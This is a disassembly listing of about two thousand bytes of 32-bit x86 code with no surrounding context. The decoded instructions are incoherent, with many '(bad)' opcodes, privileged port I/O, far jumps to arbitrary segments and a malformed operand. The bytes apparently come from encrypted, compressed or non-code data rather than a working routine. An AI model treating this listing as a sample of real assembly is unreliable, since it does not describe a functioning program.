  40a2ef:	cmp    eax,ebp
  40a2f1:	jo     0x40a30e
  40a2f3:	sti    
  40a2f4:	inc    esp
  40a2f5:	imul   esi,DWORD PTR ss:[eax],0x6ad8787a
  40a2fc:	test   eax,0xccf884c
  40a301:	es xchg ebx,eax
  40a303:	add    BYTE PTR [edi-0x405e4f0f],0x51
  40a30a:	std    
  40a30b:	(bad)  
  40a30c:	adc    eax,0xf95774f
  40a311:	ret    0x7fea
  40a314:	xchg   ebp,eax
  40a315:	dec    ebp
  40a316:	gs aam 0x6
  40a319:	pop    ss
  40a31a:	dec    ebp
  40a31b:	fnstcw WORD PTR [edx+0xa4a4fa1]
  40a321:	loopne 0x40a38e
  40a323:	cmp    DWORD PTR [esi*2+0x36033053],esi
  40a32a:	push   cs
  40a32b:	fld    DWORD PTR [esi+0xb]
  40a32e:	sub    al,0x76
  40a330:	ss xchg ebx,eax
  40a332:	or     edi,DWORD PTR [ebx+0x7c]
  40a335:	push   esp
  40a336:	cmp    eax,0xe461ac5e
  40a33b:	lds    edi,FWORD PTR [ecx+0x355951b9]
  40a341:	sub    al,0x2d
  40a343:	jge    0x40a376
  40a345:	add    al,0x6a
  40a347:	cmp    al,ch
  40a349:	repnz inc eax
  40a34b:	pop    ss
  40a34c:	pop    ecx
  40a34d:	aad    0x9b
  40a34f:	enter  0x9d25,0xd7
  40a353:	sub    al,0xa0
  40a355:	lds    edx,FWORD PTR [edx+0x2b858a7]
  40a35b:	ret    
  40a35c:	enter  0xe43f,0x49
  40a360:	dec    edi
  40a361:	xor    DWORD PTR [ebx+0x47],0x579d439a
  40a368:	inc    ebp
  40a369:	jns    0x40a2fe
  40a36b:	inc    esp
  40a36c:	cli    
  40a36d:	bswap  esp
  40a36f:	mov    esi,0xf2e77e66
  40a374:	or     al,0xb5
  40a376:	addr16 xchg ebx,eax
  40a378:	adc    DWORD PTR [ebx-0x38],0xffffffd1
  40a37c:	int3   
  40a37d:	popa   
  40a37e:	push   0xb88e94b3
  40a383:	mov    ch,0x92
  40a385:	popa   
  40a386:	mul    dl
  40a388:	jbe    0x40a3f5
  40a38a:	stos   DWORD PTR es:[edi],eax
  40a38b:	jno    0x40a3a1
  40a38d:	iret   
  40a38e:	mov    bh,0x35
  40a390:	cld    
  40a391:	fs push ecx
  40a393:	and    al,0x6e
  40a395:	daa    
  40a396:	lock lds edi,FWORD PTR [edx+0xde2c0c8]
  40a39d:	adc    DWORD PTR [ecx-0x2d],esi
  40a3a0:	sbb    BYTE PTR [ebx-0x366cda8b],dh
  40a3a6:	or     al,0x2f
  40a3a8:	adc    al,0x66
  40a3aa:	adc    BYTE PTR [eax],dl
  40a3ac:	cwde   
  40a3ad:	xor    ecx,DWORD PTR [edx-0x6f67305a]
  40a3b3:	add    ecx,esp
  40a3b5:	mov    dl,0xcd
  40a3b7:	sbb    eax,0x95dfff65
  40a3bc:	adc    BYTE PTR [ebp-0x22],ch
  40a3bf:	ins    DWORD PTR es:[edi],dx
  40a3c0:	fsub   DWORD PTR [edi+0x618abdcf]
  40a3c6:	fiadd  DWORD PTR ds:0x170f1056
  40a3cc:	cdq    
  40a3cd:	popf   
  40a3ce:	dec    edi
  40a3cf:	rcl    BYTE PTR [ebx-0x37],cl
  40a3d2:	ins    DWORD PTR es:[edi],dx
  40a3d3:	mov    eax,ds:0x99178099
  40a3d8:	cmova  eax,DWORD PTR [edi-0x6c]
  40a3dc:	daa    
  40a3dd:	xor    ecx,ebx
  40a3df:	lds    ecx,FWORD PTR [eax-0x3b]
  40a3e2:	push   ds
  40a3e3:	fdivr  st(0),st
  40a3e5:	outs   dx,BYTE PTR ds:[esi]
  40a3e6:	in     eax,dx
  40a3e7:	out    dx,eax
  40a3e8:	push   0xdbf59d75
  40a3ed:	lods   al,BYTE PTR ds:[esi]
  40a3ee:	ja     0x40a38e
  40a3f0:	cmp    eax,0x2ef3b3f3
  40a3f5:	call   0x5542:0x71de6bd9
  40a3fc:	inc    ebp
  40a3fd:	test   al,0x61
  40a3ff:	aam    0x11
  40a401:	pushf  
  40a402:	loop   0x40a431
  40a404:	sub    DWORD PTR [ebp+0x26],ebx
  40a407:	retf   
  40a408:	ret    
  40a409:	inc    esi
  40a40a:	sbb    al,0x81
  40a40c:	jb     0x40a440
  40a40e:	pop    edi
  40a40f:	idiv   DWORD PTR [ecx+0x3d]
  40a412:	mov    al,ds:0xa518a827
  40a417:	push   esi
  40a418:	jo     0x40a474
  40a41a:	(bad)  
  40a41b:	mov    ah,0x3b
  40a41d:	dec    esi
  40a41e:	mov    cl,0x38
  40a420:	xlat   BYTE PTR ds:[ebx]
  40a421:	imul   esi,ebp,0x6aee321
  40a427:	in     al,0x10
  40a429:	repnz int 0xfb
  40a42c:	mov    ebp,0x37b7fb83
  40a431:	mov    ah,0x24
  40a433:	lea    ebx,[ecx]
  40a435:	mov    ebx,0x1bf07345
  40a43a:	xchg   ecx,eax
  40a43b:	rol    BYTE PTR [esi],0x64
  40a43e:	(bad)  
  40a43f:	push   edi
  40a440:	jecxz  0x40a4bd
  40a442:	or     ebp,DWORD PTR ds:0x8de45546
  40a448:	jbe    0x40a3ca
  40a44a:	in     eax,0xa0
  40a44c:	test   eax,0xc05fd634
  40a451:	icebp  
  40a452:	or     al,0x5c
  40a454:	lods   al,BYTE PTR ds:[esi]
  40a455:	pop    ss
  40a456:	jno    0x40a3da
  40a458:	mov    bl,0x8d
  40a45a:	leave  
  40a45b:	jmp    0x40a426
  40a45d:	out    0x6d,al
  40a45f:	(bad)  
  40a460:	sub    esp,DWORD PTR [ebp-0x5f36e6a3]
  40a466:	in     eax,0xd4
  40a468:	movsx  esp,BYTE PTR [edi]
  40a46b:	test   DWORD PTR [edi],ecx
  40a46d:	sbb    BYTE PTR [ebp+0x6f3212fd],al
  40a473:	dec    edi
  40a474:	add    BYTE PTR [edx],bh
  40a476:	jb     0x40a4d0
  40a478:	mov    esp,0x13801c0a
  40a47d:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40a47f:	sub    eax,eax
  40a481:	out    dx,al
  40a482:	xor    BYTE PTR [eax],ch
  40a484:	loop   0x40a43f
  40a486:	sbb    DWORD PTR [ecx+0x16df9909],esi
  40a48c:	ins    DWORD PTR es:[edi],dx
  40a48d:	sahf   
  40a48e:	stos   DWORD PTR es:[edi],eax
  40a48f:	and    BYTE PTR cs:[ebx+0x2fd30284],dh
  40a496:	push   0x46442e7a
  40a49b:	in     al,dx
  40a49c:	ds retf 0x2fbc
  40a4a0:	in     al,0x91
  40a4a2:	jmp    0x40a46e
  40a4a4:	gs inc ecx
  40a4a6:	leavew 
  40a4a8:	push   esi
  40a4a9:	shl    ebp,1
  40a4ab:	jmp    0xe863:0xc223a963
  40a4b2:	xchg   edi,eax
  40a4b3:	std    
  40a4b4:	inc    ebp
  40a4b5:	mov    BYTE PTR [edx+0x12c9a9bb],al
  40a4bb:	mov    esp,0x913de241
  40a4c0:	int    0xe7
  40a4c2:	dec    esi
  40a4c3:	cmc    
  40a4c4:	cmp    DWORD PTR [ebx+ebx*8-0x4d],ecx
  40a4c8:	retf   0xb93d
  40a4cb:	daa    
  40a4cc:	inc    eax
  40a4cd:	(bad)  
  40a4ce:	int    0x62
  40a4d0:	pop    ebp
  40a4d1:	rcl    BYTE PTR [ebp+0x6d65dd95],0xc3
  40a4d8:	lock sbb bl,0x3d
  40a4dc:	jbe    0x40a4c4
  40a4de:	leave  
  40a4df:	pushf  
  40a4e0:	daa    
  40a4e1:	mov    eax,0x8f0e5807
  40a4e6:	stos   DWORD PTR es:[edi],eax
  40a4e7:	outs   dx,DWORD PTR ds:[esi]
  40a4e8:	rcl    al,cl
  40a4ea:	sbb    eax,0xf762a2b3
  40a4ef:	(bad)  
  40a4f0:	popa   
  40a4f1:	ret    0x4196
  40a4f4:	cld    
  40a4f5:	fwait
  40a4f6:	push   es
  40a4f7:	int3   
  40a4f8:	call   0x38752bec
  40a4fd:	ret    
  40a4fe:	jg     0x40a4f6
  40a500:	sub    ecx,DWORD PTR ds:0x9c261e23
  40a506:	dec    eax
  40a507:	lea    edx,[ebx+0x6e381e85]
  40a50d:	das    
  40a50e:	clc    
  40a50f:	adc    BYTE PTR ds:0xbccc3dee,ch
  40a515:	xchg   ecx,eax
  40a516:	test   DWORD PTR [edi+0x3f],edi
  40a519:	and    BYTE PTR cs:[ecx-0x6fb7ade5],ch
  40a520:	mov    DWORD PTR [ebx],esp
  40a522:	ret    0x3040
  40a525:	mov    ?,WORD PTR [ecx-0x2a92200b]
  40a52b:	sub    al,0xc
  40a52d:	sbb    DWORD PTR [eax],0x2b
  40a530:	adc    ecx,ebx
  40a532:	scas   al,BYTE PTR es:[edi]
  40a533:	pushf  
  40a534:	add    edx,ecx
  40a536:	inc    ebp
  40a537:	pusha  
  40a538:	(bad)  
  40a539:	stos   DWORD PTR es:[edi],eax
  40a53a:	cmp    DWORD PTR [ecx-0x14],esp
  40a53d:	test   DWORD PTR [eax-0x62cc041b],esp
  40a543:	iret   
  40a544:	pusha  
  40a545:	std    
  40a546:	push   esi
  40a547:	hlt    
  40a548:	push   0xb9e48d65
  40a54d:	mov    edi,0xa9df8755
  40a552:	add    al,ah
  40a554:	arpl   WORD PTR [edx-0xb],bp
  40a557:	jmp    0xb5cab21e
  40a55c:	push   cs
  40a55d:	sti    
  40a55e:	mov    ds:0x2a688318,ax
  40a564:	xchg   esp,eax
  40a565:	clc    
  40a566:	and    eax,0xea729855
  40a56b:	mov    ch,0x5d
  40a56d:	or     ecx,edx
  40a56f:	mov    edi,eax
  40a571:	xchg   DWORD PTR [esi-0x3b933ec8],ebp
  40a577:	mov    ebx,0xa9a453aa
  40a57c:	(bad)
  40a580:	sbb    dh,BYTE PTR [edx]
  40a582:	jle    0x40a519
  40a584:	xor    esp,DWORD PTR [ebx+0x238077f8]
  40a58a:	pop    edx
  40a58b:	jb     0x40a57b
  40a58d:	mov    al,ds:0xaecdd2ea
  40a592:	mov    edi,0x44669802
  40a597:	adc    bh,BYTE PTR [ebp*1+0x429847d3]
  40a59e:	(bad)  
  40a59f:	adc    DWORD PTR [ebp-0x3d],ecx
  40a5a2:	xchg   ebp,eax
  40a5a3:	cmp    ebp,edx
  40a5a5:	bound  ebx,QWORD PTR [edi]
  40a5a7:	push   ds
  40a5a8:	sub    ecx,esp
  40a5aa:	or     al,0x21
  40a5ac:	out    dx,eax
  40a5ad:	int3   
  40a5ae:	inc    ebp
  40a5af:	mov    cl,0xd3
  40a5b1:	mov    ds:0x6bef6701,eax
  40a5b6:	and    DWORD PTR [esi-0x32],eax
  40a5b9:	mov    BYTE PTR [esi],cl
  40a5bb:	dec    ebx
  40a5bc:	or     ecx,edi
  40a5be:	xchg   ebp,eax
  40a5bf:	dec    eax
  40a5c0:	jp     0x40a63d
  40a5c2:	in     al,0xc
  40a5c4:	hlt    
  40a5c5:	retf   
  40a5c6:	mov    ebp,0x5da19e70
  40a5cb:	adc    al,BYTE PTR [ebp-0x16edad8f]
  40a5d1:	sbb    al,0xf
  40a5d3:	inc    ecx
  40a5d4:	or     DWORD PTR [edx],edi
  40a5d6:	aam    0xe9
  40a5d8:	xchg   esp,eax
  40a5d9:	(bad)  
  40a5da:	(bad)  
  40a5dc:	or     eax,ebp
  40a5de:	mov    eax,0xc416568a
  40a5e3:	and    BYTE PTR [ebx],bl
  40a5e5:	mov    ds:0x604464c2,eax
  40a5ea:	(bad)  
  40a5eb:	mov    ebx,0xf521448f
  40a5f0:	aas    
  40a5f1:	rcl    DWORD PTR [ebp+ecx*8+0x50],cl
  40a5f5:	add    bl,BYTE PTR [ecx+esi*8-0x1ccbe0c9]
  40a5fc:	enter  0xb019,0x1
  40a600:	sbb    ch,BYTE PTR [edi-0x43]
  40a603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a604:	mov    al,0xf7
  40a606:	out    dx,al
  40a607:	lds    ebx,FWORD PTR [edi]
  40a609:	pushf  
  40a60a:	push   0x41
  40a60c:	jbe    0x40a676
  40a60e:	or     eax,0x863961b9
  40a613:	ffreep st(2)
  40a615:	adc    eax,0x6ccae65e
  40a61a:	or     ebx,0x8165f0eb
  40a620:	cbw    
  40a622:	call   0xff59c4a3
  40a627:	push   esp
  40a628:	out    0xd3,al
  40a62a:	aad    0xda
  40a62c:	scas   al,BYTE PTR es:[edi]
  40a62d:	fnstenv [esi]
  40a62f:	dec    edx
  40a630:	jbe    0x40a5ce
  40a632:	aad    0x90
  40a634:	adc    DWORD PTR fs:[edx],ebx
  40a637:	pop    esp
  40a638:	je     0x40a68a
  40a63a:	sub    al,0xd5
  40a63c:	and    edx,edi
  40a63e:	loope  0x40a5f1
  40a640:	mov    fs,WORD PTR [esi]
  40a642:	lods   al,BYTE PTR ds:[esi]
  40a643:	and    DWORD PTR [ebx-0x1],ebx
  40a646:	sbb    dl,bh
  40a648:	inc    esp
  40a649:	lock mov fs,WORD PTR [esp+edx*1+0x11]
  40a64e:	inc    ecx
  40a64f:	and    DWORD PTR [edi-0x4c63748c],ebp
  40a655:	add    BYTE PTR [esp+ecx*4],bl
  40a658:	test   eax,0xb85c6f29
  40a65d:	push   esi
  40a65e:	shl    BYTE PTR [esi],cl
  40a660:	cmc    
  40a661:	mov    ebx,0xead31e01
  40a666:	and    ebx,esp
  40a668:	xor    al,0x7f
  40a66a:	(bad)  [esi+0x62189cac]
  40a670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a671:	dec    ecx
  40a672:	fsub   QWORD PTR [ebx]
  40a674:	sub    al,0xeb
  40a676:	inc    esi
  40a677:	inc    eax
  40a678:	mov    edx,0x2765f735
  40a67d:	daa    
  40a67e:	push   ss
  40a67f:	int    0x27
  40a681:	mov    esi,DWORD PTR [edx]
  40a683:	(bad)  
  40a684:	(bad)  
  40a686:	xor    ebp,DWORD PTR [esi-0x7d]
  40a689:	sbb    al,BYTE PTR [ecx+0x21]
  40a68c:	lahf   
  40a68d:	mov    ds:0x419bff06,eax
  40a692:	and    DWORD PTR [edx+ebx*1+0x1f],eax
  40a696:	add    eax,0x2f95b2bf
  40a69b:	xchg   BYTE PTR [edx+edx*1-0x4],bl
  40a69f:	sub    esi,DWORD PTR [ecx-0x76]
  40a6a2:	loop   0x40a6d6
  40a6a4:	dec    esp
  40a6a5:	xchg   ebp,eax
  40a6a6:	arpl   WORD PTR [esi-0x8],bx
  40a6a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6aa:	mov    edi,0xefdf4f80
  40a6af:	test   eax,0x9d04eed3
  40a6b4:	mov    ah,0x41
  40a6b6:	lahf   
  40a6b7:	aam    0xb1
  40a6b9:	sub    edx,esi
  40a6bb:	xor    dl,BYTE PTR [esi-0xa09325d]
  40a6c1:	gs and eax,ebp
  40a6c4:	mov    al,0xa7
  40a6c6:	push   esi
  40a6c7:	outs   dx,DWORD PTR ds:[esi]
  40a6c8:	(bad)  
  40a6c9:	xchg   esi,eax
  40a6ca:	les    ebx,FWORD PTR [ebx+0x5b]
  40a6cd:	imul   ebp,DWORD PTR [edx+0x47],0xffffffa2
  40a6d1:	inc    edx
  40a6d2:	sahf   
  40a6d3:	adc    eax,0xa60c386c
  40a6d8:	(bad)  
  40a6d9:	sbb    BYTE PTR [ebx-0x33],cl
  40a6dc:	or     DWORD PTR [ecx+0x3f],eax
  40a6df:	mov    edi,eax
  40a6e1:	(bad)  
  40a6e3:	dec    ecx
  40a6e4:	and    DWORD PTR [ebx-0x5b1fe216],edx
  40a6ea:	sbb    al,0x36
  40a6ec:	sbb    esp,esi
  40a6ee:	mov    ch,0x1b
  40a6f0:	cld    
  40a6f1:	scas   al,BYTE PTR es:[edi]
  40a6f2:	sti    
  40a6f3:	lods   eax,DWORD PTR ds:[esi]
  40a6f4:	addr16 test al,0x24
  40a6f7:	mov    ebx,0x6044bc33
  40a6fc:	pushf  
  40a6fd:	push   cs
  40a6fe:	adc    ecx,ecx
  40a700:	cwde   
  40a701:	pop    ss
  40a702:	out    dx,eax
  40a703:	sbb    al,0xb6
  40a705:	lahf   
  40a706:	test   al,0xed
  40a708:	adc    BYTE PTR [esp+eax*8-0x50ebf6ba],ah
  40a70f:	xor    dl,BYTE PTR [ecx]
  40a711:	(bad)  
  40a712:	scas   eax,DWORD PTR es:[edi]
  40a713:	lea    esp,[ecx+0x47]
  40a716:	pop    edi
  40a717:	inc    edi
  40a718:	mov    ds:0x673d6759,eax
  40a71d:	repnz retf 0xc609
  40a721:	loope  0x40a787
  40a723:	cmp    eax,0x5376a6f3
  40a728:	fisttp DWORD PTR [eax-0x6b]
  40a72b:	out    0x74,al
  40a72d:	outs   dx,DWORD PTR ds:[esi]
  40a72e:	or     edi,DWORD PTR [ebp+0xe]
  40a731:	pop    ss
  40a732:	adc    DWORD PTR es:[edx+0x57f3342],edi
  40a739:	mov    bl,0xe8
  40a73b:	pop    esp
  40a73c:	pop    ebp
  40a73d:	ret    
  40a73e:	addr16 repnz dec esi
  40a741:	std    
  40a742:	jl     0x40a6e8
  40a744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a745:	loope  0x40a6ef
  40a747:	pop    edi
  40a748:	jns    0x40a6df
  40a74a:	jb     0x40a7ca
  40a74c:	fwait
  40a74d:	(bad)  
  40a74e:	in     al,0xb8
  40a750:	mov    cs,ebp
  40a752:	jmp    FWORD PTR [esi+0x7f895298]
  40a758:	jae    0x40a729
  40a75a:	inc    ebp
  40a75b:	mov    edx,0xabcf1270
  40a760:	clc    
  40a761:	aas    
  40a762:	hlt    
  40a763:	xchg   ecx,eax
  40a764:	inc    eax
  40a765:	sub    al,0x68
  40a767:	inc    ebp
  40a768:	cmp    dh,ah
  40a76a:	jmp    0x8e0e:0x3f8853bd
  40a771:	std    
  40a772:	xor    bl,ch
  40a774:	mov    cl,0x38
  40a776:	arpl   WORD PTR [edx+0x916eb45],ax
  40a77c:	cmp    DWORD PTR [eax+0x702b800e],0x6f7ca475
  40a786:	push   bp
  40a788:	push   esp
  40a789:	pusha  
  40a78a:	outs   dx,BYTE PTR ds:[esi]
  40a78b:	std    
  40a78c:	add    esp,DWORD PTR [ecx]
  40a78e:	pop    esp
  40a78f:	mov    ebp,0xf73b9a29
  40a794:	call   0xf46f:0x46acf6d5
  40a79b:	sbb    esi,DWORD PTR [ecx+0x37dd7f15]
  40a7a1:	xor    al,0xde
  40a7a3:	sbb    cl,BYTE PTR [edx-0x2cd0e968]
  40a7a9:	mov    ebp,0xd907364c
  40a7ae:	pop    edx
  40a7af:	mov    cl,0xcb
  40a7b1:	ja     0x40a82c
  40a7b3:	mov    bh,dh
  40a7b5:	add    DWORD PTR [ebx-0x77],ebp
  40a7b8:	xchg   ebp,eax
  40a7b9:	inc    ecx
  40a7ba:	dec    edi
  40a7bb:	jmp    0x82f6:0x349d1149
  40a7c2:	(bad)  
  40a7c3:	add    BYTE PTR [edi],bh
  40a7c5:	(bad)  
  40a7c7:	arpl   WORD PTR [esi-0x44],dx
  40a7ca:	stos   BYTE PTR es:[edi],al
  40a7cb:	mov    dh,0xa8
  40a7cd:	(bad)  
  40a7cf:	xchg   BYTE PTR [ebx+0x75d463a1],bl
  40a7d5:	push   ds
  40a7d6:	xchg   edi,eax
  40a7d7:	out    dx,eax
  40a7d8:	xchg   ebx,eax
  40a7d9:	xor    BYTE PTR [esp+ebx*2-0x2f],bl
  40a7dd:	cmp    bh,cl
  40a7df:	pop    edi
  40a7e0:	pop    esp
  40a7e1:	mov    eax,ds:0xfe1821c2
  40a7e6:	push   esi
  40a7e7:	enter  0x2bca,0x34
  40a7eb:	imul   ebp,ecx,0x5b03331e
  40a7f1:	retf   
  40a7f2:	repz or dl,BYTE PTR [esi-0x38f642d6]
  40a7f9:	push   ebx
  40a7fa:	mov    esp,0x721e727a
  40a7ff:	aam    0xef
  40a801:	sbb    ebx,ebx
  40a803:	test   eax,0x736ee467
  40a808:	stos   BYTE PTR es:[edi],al
  40a809:	mov    DWORD PTR [eax],edx
  40a80b:	fbld   TBYTE PTR [ebx]
  40a80d:	ins    BYTE PTR es:[edi],dx
  40a80e:	add    al,0x50
  40a810:	stos   DWORD PTR es:[edi],eax
  40a811:	jae    0x40a7e2
  40a813:	idiv   edx
  40a815:	call   0x56b12354
  40a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a81b:	fadd   st(6),st
  40a81d:	fild   DWORD PTR [edx+0x58d38b1e]
  40a823:	mov    fs,ebx
  40a825:	mov    al,es:0x22e01fde
  40a82b:	adc    BYTE PTR [ebx+0x5c],0x11
  40a82f:	xor    DWORD PTR [ebx],0x30
  40a832:	sub    ecx,esp
  40a834:	jl     0x40a7c1
  40a836:	adc    edi,ebp
  40a838:	dec    eax
  40a839:	test   BYTE PTR ds:0x3e55c381,0x7e
  40a840:	cmp    sp,WORD PTR [esi]
  40a843:	arpl   WORD PTR [edx-0x68],bp
  40a846:	aas    
  40a847:	push   cs
  40a848:	ds jno 0x40a7e6
  40a84b:	sbb    eax,DWORD PTR [esi+0x57]
  40a84e:	mov    dh,BYTE PTR [eax-0x1a69504d]
  40a854:	xor    ch,al
  40a856:	(bad)  
  40a857:	sub    eax,0x416bf1f4
  40a85c:	pop    ebp
  40a85d:	dec    cl
  40a85f:	inc    ax
  40a861:	xchg   esp,eax
  40a862:	push   0xa7043ba3
  40a867:	sub    BYTE PTR [esp+edx*8-0x3b004cbb],0x72
  40a86f:	data16 jb 0x40a877
  40a872:	ficomp WORD PTR [ebp+0xb6c7387]
  40a878:	pusha  
  40a879:	dec    ecx
  40a87a:	arpl   WORD PTR [ebx-0x62],dx
  40a87d:	scas   al,BYTE PTR es:[edi]
  40a87e:	call   DWORD PTR [esi-0x6f6704e8]
  40a884:	push   ds
  40a885:	(bad)  
  40a886:	neg    BYTE PTR [ecx-0x51]
  40a889:	jmp    0x6ade1248
  40a88e:	pop    eax
  40a88f:	out    dx,al
  40a890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a891:	mov    ds:0xe0216519,al
  40a896:	jecxz  0x40a89a
  40a898:	xor    ch,BYTE PTR [edx+ebp*8-0x7f]
  40a89c:	xchg   ecx,eax
  40a89d:	fsubr  QWORD PTR [ebp+0x2bd5c79e]
  40a8a3:	push   esi
  40a8a4:	cli    
  40a8a5:	mov    ebx,0xdd34494
  40a8aa:	(bad)  
  40a8ab:	ror    DWORD PTR [edx-0xb],cl
  40a8ae:	stc    
  40a8af:	xchg   BYTE PTR [ebp+0x26],ah
  40a8b2:	and    DWORD PTR [edi],edx
  40a8b4:	mov    edi,0xeda4b58c
  40a8b9:	in     eax,0x2f
  40a8bb:	not    DWORD PTR [ebp+0x23]
  40a8be:	fwait
  40a8bf:	imul   edx,ebp,0x28
  40a8c2:	loop   0x40a8c2
  40a8c4:	fdivr  DWORD PTR [esi+ecx*8]
  40a8c7:	shl    ebx,0x2e
  40a8ca:	enter  0xfb3c,0x48
  40a8ce:	leave  
  40a8cf:	xlat   BYTE PTR ds:[ebx]
  40a8d0:	ret    
  40a8d1:	loope  0x40a853
  40a8d3:	daa    
  40a8d4:	loopne 0x40a8ef
  40a8d6:	mov    eax,ds:0x1c5517e9
  40a8db:	cmp    BYTE PTR [ecx],al
  40a8dd:	ja     0x40a87c
  40a8df:	and    BYTE PTR [ebx+ebp*4],ch
  40a8e2:	xchg   edi,eax
  40a8e3:	inc    esi
  40a8e4:	and    BYTE PTR [ebx-0x3e],bl
  40a8e7:	rcl    BYTE PTR [ecx-0x53],0xfa
  40a8eb:	int3   
  40a8ec:	icebp  
  40a8ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8ee:	pop    ds
  40a8ef:	js     0x40a928
  40a8f1:	inc    edi
  40a8f2:	call   0xee05a8
  40a8f7:	pop    edx
  40a8f8:	dec    edx
  40a8f9:	push   es
  40a8fa:	dec    ebx
  40a8fb:	dec    ebx
  40a8fc:	inc    BYTE PTR [eax-0x7b130426]
  40a902:	push   eax
  40a903:	xor    edi,DWORD PTR [ecx]
  40a905:	xchg   DWORD PTR [ebp-0x64ef106a],ebp
  40a90b:	and    DWORD PTR [edi],ebp
  40a90d:	jecxz  0x40a8af
  40a90f:	adc    BYTE PTR [edx+0x1e7ba6a9],bl
  40a915:	cdq    
  40a916:	xchg   edi,eax
  40a917:	cs lock inc ecx
  40a91a:	pop    ebx
  40a91b:	out    0xbf,eax
  40a91d:	inc    ebp
  40a91e:	test   ah,bh
  40a920:	mov    edi,0xd12b1e3d
  40a925:	xor    ecx,ebx
  40a927:	mov    dl,0xce
  40a929:	sub    bl,BYTE PTR [ecx+edi*8-0x3e]
  40a92d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a92e:	add    esi,edi
  40a930:	test   BYTE PTR [edx],al
  40a932:	mov    al,ds:0x679c3d41
  40a937:	lods   al,BYTE PTR ds:[esi]
  40a938:	xor    al,0xbc
  40a93a:	daa    
  40a93b:	ss lock je 0x40a905
  40a93f:	call   0x8612:0x700916e3
  40a946:	mov    dl,0x9c
  40a948:	add    eax,0xe6bd3ed2
  40a94d:	adc    eax,0x165d5f3c
  40a952:	mov    bl,0x6f
  40a954:	inc    esp
  40a955:	xor    al,BYTE PTR [esi-0x400505d1]
  40a95b:	js     0x40a8fd
  40a95d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a95e:	fadd   QWORD PTR [edi+0x4b]
  40a961:	jle    0x40a902
  40a963:	nop
  40a964:	push   eax
  40a965:	and    al,0xd7
  40a968:	lea    ebx,[ebx-0x5c]
  40a96b:	push   edi
  40a96c:	daa    
  40a96d:	add    dl,BYTE PTR ds:[ecx]
  40a970:	adc    al,dl
  40a972:	aam    0x12
  40a974:	mov    al,0xf3
  40a976:	imul   ebx,esp,0xb8601a8b
  40a97c:	loopne 0x40a9c7
  40a97e:	mov    esp,ecx
  40a980:	pusha  
  40a981:	fbld   TBYTE PTR [ecx]
  40a983:	je     0x40a968
  40a985:	rcr    BYTE PTR [ecx+edi*1-0x1b0b1502],cl
  40a98c:	fwait
  40a98d:	xchg   ebx,eax
  40a98e:	mov    dh,0xb8
  40a990:	push   edi
  40a991:	pop    eax
  40a992:	fmul   QWORD PTR [edi]
  40a994:	out    0xf3,eax
  40a996:	add    eax,0xd8e222ce
  40a99b:	(bad)  
  40a99c:	cdq    
  40a99d:	lods   al,BYTE PTR ds:[esi]
  40a99e:	stos   DWORD PTR es:[edi],eax
  40a99f:	xchg   BYTE PTR [ebx-0x395dfaa5],dl
  40a9a5:	sbb    bh,cl
  40a9a7:	sar    DWORD PTR ss:[eax],cl
  40a9aa:	clc    
  40a9ab:	push   esp
  40a9ac:	mov    bh,dl
  40a9ae:	out    0x89,eax
  40a9b0:	dec    edi
  40a9b1:	lahf   
  40a9b2:	retf   
  40a9b3:	mov    cl,0x5b
  40a9b5:	enter  0x8263,0xda
  40a9b9:	test   BYTE PTR [esi],ch
  40a9bb:	fidivr WORD PTR [ecx]
  40a9bd:	sub    al,0xea
  40a9bf:	mov    esi,0x3d735388
  40a9c4:	lds    edx,FWORD PTR [ebx-0x769f602b]
  40a9ca:	enter  0x97e2,0xf9
  40a9ce:	xchg   BYTE PTR [ebx],bh
  40a9d0:	fld    DWORD PTR [ebx+0x1b4b3ae6]
  40a9d6:	aaa    
  40a9d7:	mov    ah,al
  40a9d9:	jno    0x40a99e
  40a9db:	xchg   BYTE PTR [eax],bl
  40a9dd:	and    eax,0xf8c700b2
  40a9e2:	mov    ds:0xabe5888b,al
  40a9e7:	loopne 0x40aa3e
  40a9e9:	mov    al,0x96
  40a9eb:	mov    DWORD PTR [eax+eax*2+0x8],esp
  40a9ef:	fbstp  TBYTE PTR [ebp-0x25]
  40a9f2:	xor    eax,0xc294a2c
  40a9f7:	push   ebx
  40a9f8:	stos   BYTE PTR es:[edi],al
  40a9f9:	dec    edx
  40a9fa:	pushf  
  40a9fb:	cmc    
  40a9fc:	loop   0x40a9fa
  40a9fe:	dec    eax
  40a9ff:	cdq    
  40aa00:	fisub  DWORD PTR [esi-0x44]
  40aa03:	inc    ebp
  40aa04:	xor    DWORD PTR ds:0x8de40974,eax
  40aa0a:	popf   
  40aa0b:	mov    bh,0x7d
  40aa0e:	iret   
  40aa0f:	stos   BYTE PTR es:[edi],al
  40aa10:	dec    ebx
  40aa11:	cwde   
  40aa12:	shl    al,0xa9
  40aa15:	add    edi,DWORD PTR [esp+ecx*1-0x6b]
  40aa19:	and    esp,DWORD PTR [esi-0x1abd8d75]
  40aa1f:	jo     0x40a9a8
  40aa21:	jnp    0x40a9b7
  40aa23:	leave  
  40aa24:	out    dx,al
  40aa25:	pop    ss
  40aa26:	clc    
  40aa27:	push   ebp
  40aa28:	loop   0x40aa71
  40aa2a:	jnp    0x40a9df
  40aa2c:	int3   
  40aa2d:	pop    esi
  40aa2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa2f:	dec    ebx
  40aa30:	repz or esp,edx
  40aa33:	jmp    0x8a0e6366
  40aa38:	in     eax,dx
  40aa39:	and    dh,BYTE PTR [ebx-0x17]
  40aa3c:	inc    esi
  40aa3d:	jp     0x40aab2
  40aa3f:	cli    
  40aa40:	push   DWORD PTR ds:0x294de6b
  40aa46:	pop    edx
  40aa47:	adc    BYTE PTR [esi-0x6d4710b0],dh
  40aa4d:	push   0xf32fd74d
  40aa52:	lahf   
  40aa53:	test   DWORD PTR ss:[ebx-0x17b668ec],eax
  40aa5a:	loop   0x40a9f4
  40aa5c:	test   eax,0xcb36bf52
  40aa61:	scas   al,BYTE PTR es:[edi]
  40aa62:	ja     0x40aa0d
  40aa64:	and    al,0x85
  40aa66:	cwde   
